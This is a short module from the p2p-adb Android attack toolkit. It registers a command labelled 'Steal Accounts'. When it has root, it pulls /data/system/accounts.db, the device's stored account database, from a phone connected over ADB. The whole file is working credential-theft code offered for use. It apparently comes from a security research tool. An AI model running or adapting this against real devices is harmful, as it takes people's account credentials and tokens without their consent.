# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com


# Registering command
registerCommand "5:getAccounts:Steal Accounts"


getAccounts(){
	echo $ISROOT

	if [ $ISROOT -le 1 ]; then
		DATAPATH="/data/system/accounts.db"
		echo 'We are root...'
		getData "$DATAPATH"
	else
		echo $ISROOT
	fi
}
